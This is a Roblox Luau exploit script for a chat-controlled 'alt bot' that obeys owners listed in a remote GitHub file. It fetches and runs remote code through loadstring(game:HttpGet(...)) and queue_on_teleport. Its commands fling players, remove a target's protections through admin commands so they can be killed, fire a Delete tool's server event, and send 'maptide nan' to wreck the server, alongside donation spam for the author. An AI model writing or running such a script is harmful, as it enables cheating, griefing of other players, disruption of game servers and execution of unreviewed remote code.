local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local spinning = false
local scriptConnection = nil
local following = false
local followTarget = nil

local ownersURL = "https://raw.githubusercontent.com/Ali-droidlol/BlacklistTCO/main/Users.json"

local ownerUsernames = {}

UserInputService.WindowFocusReleased:Connect(function()
	task.wait(0.1)

	game:GetService("ReplicatedStorage"):WaitForChild("System"):FireServer("Focused")
end)

local success, response = pcall(function()
	return game:HttpGet(ownersURL)
end)

if success then
	ownerUsernames = HttpService:JSONDecode(response)
else
	warn("Failed to load owners!")
	return
end

local function chat(msg)
	pcall(function()
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
	end)

	pcall(function()
		local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

		if channel then
			channel:SendAsync(msg)
		end
	end)
end

chat("script loading Credits to HOT_DOGN -- Alt Bot Private")

pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

local function isOwner(player)
	return ownerUsernames[player.Name] == true
end

local function findPlayerByPartial(partial)
	partial = partial:lower()
	for _, p in ipairs(Players:GetPlayers()) do
		if p.Name:lower():find(partial, 1, true) or p.DisplayName:lower():find(partial, 1, true) then
			return p
		end
	end
	return nil
end

-- Follow loop
task.spawn(function()
	while true do
		if following and followTarget then
			local myChar = LocalPlayer.Character
			local targetChar = followTarget.Character

			if myChar and targetChar then
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")

				if myHRP and targetHRP then
					myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
				end
			end
		end
		task.wait(0.1)
	end
end)

local function handleMessage(message)

	if not message.TextSource then
		return
	end

	local player = Players:GetPlayerByUserId(message.TextSource.UserId)

	if not player then
		return
	end

	if not isOwner(player) then
		return
	end

	local msg = tostring(message.Text)

	local command, text = msg:match("^!(%w+)%s*(.*)$")

	if not command then
		return
	end

	command = string.lower(command)

	if command == "say" then

		if text ~= "" then
			chat(text)
		end

	elseif command == "teleport" or command == "tp" then

		local myChar = LocalPlayer.Character
		local ownerChar = player.Character

		if myChar and ownerChar then

			local myHRP = myChar:FindFirstChild("HumanoidRootPart")
			local ownerHRP = ownerChar:FindFirstChild("HumanoidRootPart")

			if myHRP and ownerHRP then
				myHRP.CFrame = ownerHRP.CFrame
			end
		end

	elseif command == "fling" then

		if text ~= "" then
			chat(".fling " .. text)
		end

	elseif command == "glaze" or command == "glz" then

		if text ~= "" then
			chat(text .. " is the best")
		end

	elseif command == "donate" then

		if text ~= "" then
			chat("donate " .. text)
		end

	elseif command == "dall" then

		chat("donate hot.dogn 100")

	elseif command == "credits" then

		chat("Alt Bot V4.5 Private - Hot_Dogn")

	elseif command == "reset" then

		local character = LocalPlayer.Character

		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.Health = 0
			end
		end

	elseif command == "jump" then

		local character = LocalPlayer.Character

		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.Jump = true
			end
		end

	elseif command == "spin" then

		if spinning then
			return
		end

		spinning = true

		task.spawn(function()
			while spinning do
				local character = LocalPlayer.Character
				if character then
					local hrp = character:FindFirstChild("HumanoidRootPart")
					if hrp then
						hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(10), 0)
					end
				end
				task.wait(0.03)
			end
		end)

	elseif command == "unspin" then

		spinning = false

	elseif command == "freeze" or command == "fr" then

		local character = LocalPlayer.Character

		if character then
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp then
				hrp.Anchored = true
			end
		end

	elseif command == "unfreeze" or command == "ufr" then

		local character = LocalPlayer.Character

		if character then
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp then
				hrp.Anchored = false
			end
		end

	elseif command == "dance" or command == "d" then

		pcall(function()
			local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 0
				local animator = hum:FindFirstChildOfClass("Animator")
				if animator then
					local anim = Instance.new("Animation")
					anim.AnimationId = "rbxassetid://507770239"
					local track = animator:LoadAnimation(anim)
					track:Play()
				end
			end
		end)

	elseif command == "stopdance" or command == "sd" then

		pcall(function()
			local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 16
				local animator = hum:FindFirstChildOfClass("Animator")
				if animator then
					for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
						track:Stop()
					end
				end
			end
		end)

	elseif command == "rejoin" or command == "rj" then

		queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/Ali-droidlol/BlacklistTCO/refs/heads/main/BotScript"))
		task.wait(0.5)
		TeleportService:Teleport(game.PlaceId, LocalPlayer)

	elseif command == "stop" then

		spinning = false
		following = false
		followTarget = nil
		if scriptConnection then
			scriptConnection:Disconnect()
			scriptConnection = nil
		end
		chat("Bot stopped.")

	elseif command == "follow" or command == "f" then

		if text == "" then
			return
		end

		local target = findPlayerByPartial(text)
		if not target then
			return
		end

		followTarget = target
		following = true

	elseif command == "unfollow" or command == "uf" then

		following = false
		followTarget = nil

	elseif command == "quickvamp" or command == "qv" then

		if text == "" then
			return
		end

		local target = findPlayerByPartial(text)
		if not target then
			return
		end

		local character = LocalPlayer.Character
		local backpack = LocalPlayer:FindFirstChild("Backpack")

		if not character or not backpack then
			return
		end

		local humanoid = character:FindFirstChildOfClass("Humanoid")

		-- Check if VampireVanquisher is already in inventory
		local vamp = character:FindFirstChild("VampireVanquisher") or backpack:FindFirstChild("VampireVanquisher")

		if not vamp then
			-- Try to get it using The Arkenstone
			local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")

			if arkenstone then
				if arkenstone.Parent == backpack then
					humanoid:EquipTool(arkenstone)
					task.wait(0.5)
				end
				chat(";gear me 94794847")
				task.wait(1)
			else
				return
			end
		end

		-- Say ff and god on self, then unff and ungod on target with Arkenstone in hand
		local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")
		if arkenstone then
			if arkenstone.Parent == backpack then
				humanoid:EquipTool(arkenstone)
				task.wait(0.5)
			end
			chat(";ff a")
			task.wait(0.5)
			chat(";god a")
			task.wait(0.5)
			chat(";unff " .. target.Name)
			task.wait(0.5)
			chat(";ungod " .. target.Name)
			task.wait(0.5)
		end

		-- Equip VampireVanquisher
		vamp = character:FindFirstChild("VampireVanquisher") or backpack:FindFirstChild("VampireVanquisher")

		if not vamp then
			return
		end

		if vamp.Parent == backpack then
			humanoid:EquipTool(vamp)
			task.wait(0.3)
		end

		-- Follow target until their health is 0 or 10 seconds pass
		local elapsed = 0

		task.spawn(function()
			while elapsed < 10 do
				local myChar = LocalPlayer.Character
				local targetChar = target.Character

				if not myChar or not targetChar then
					break
				end

				local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")

				if not targetHumanoid or targetHumanoid.Health <= 0 then
					break
				end

				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")

				if myHRP and targetHRP then
					myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 2)
				end

				task.wait(0.1)
				elapsed = elapsed + 0.1
			end
		end)

	elseif command == "disablebkit" or command == "dbk" then

		local character = LocalPlayer.Character
		local backpack = LocalPlayer:FindFirstChild("Backpack")

		if not character or not backpack then
			return
		end

		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local deleteTool = character:FindFirstChild("Delete") or backpack:FindFirstChild("Delete")

		if deleteTool then
			if deleteTool.Parent == backpack then
				humanoid:EquipTool(deleteTool)
				task.wait(0.5)
			end

			local dtool = character:FindFirstChild("Delete")

			if dtool and dtool:FindFirstChild("Script") then
				dtool.Script.Event:FireServer(
					game.ReplicatedStorage.Brick,
					character.HumanoidRootPart.Position
				)
			end
		end

	elseif command == "servershutdown" or command == "ssh" then

		local character = LocalPlayer.Character
		local backpack = LocalPlayer:FindFirstChild("Backpack")

		if not character or not backpack then
			return
		end

		local humanoid = character:FindFirstChildOfClass("Humanoid")

		-- Delete tool
		local deleteTool = character:FindFirstChild("Delete") or backpack:FindFirstChild("Delete")

		if deleteTool then

			if deleteTool.Parent == backpack then
				humanoid:EquipTool(deleteTool)
				task.wait(0.5)
			end

			local dtool = character:FindFirstChild("Delete")

			if dtool and dtool:FindFirstChild("Script") then
				dtool.Script.Event:FireServer(
					game.ReplicatedStorage.Brick,
					character.HumanoidRootPart.Position
				)
			end

		else

			-- No Delete tool, try Arkenstone to get bkit
			local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")

			if arkenstone then
				if arkenstone.Parent == backpack then
					humanoid:EquipTool(arkenstone)
					task.wait(0.5)
				end
				chat(";bkit me")
				task.wait(1)
			end
		end

		-- The Arkenstone for maptide
		local arkenstone = character:FindFirstChild("The Arkenstone") or backpack:FindFirstChild("The Arkenstone")

		if arkenstone then

			if arkenstone.Parent == backpack then
				humanoid:EquipTool(arkenstone)
				task.wait(0.5)
			end

			chat("delcubes a")
			task.wait(1)

			chat("maptide nan")
			task.wait(0.5)

			chat("reset o")
		end
	end
end

local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

if channel then
	scriptConnection = channel.MessageReceived:Connect(handleMessage)
end
